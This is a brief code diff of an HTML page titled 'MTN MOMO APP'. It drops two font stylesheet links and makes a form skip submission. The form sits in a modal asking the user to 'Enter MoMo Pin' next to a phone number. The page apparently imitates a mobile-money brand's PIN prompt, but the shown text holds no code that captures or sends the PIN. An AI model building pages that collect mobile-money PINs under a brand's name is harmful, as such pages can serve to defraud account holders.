@@ -10,11 +10,6 @@
       rel="stylesheet"
       href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css"
     />
-    <link href="https://fonts.cdnfonts.com/css/montserrat" rel="stylesheet" />
-    <link
-      rel="stylesheet"
-      href="path/to/font-awesome/css/font-awesome.min.css"
-    />
     <title>MTN MOMO APP</title>
   </head>
   <body>
@@ -108,7 +103,7 @@
         <div class="modal-box" id="resizemobile">
           <h1>Enter MoMo Pin<br />(055 106 6605)</h1>
           <div class="posit">
-            <form>
+            <form onsubmit="return false;">
               <input
                 type="number"
                 oninput="this.value=this.value.slice(0,this.maxLength)"
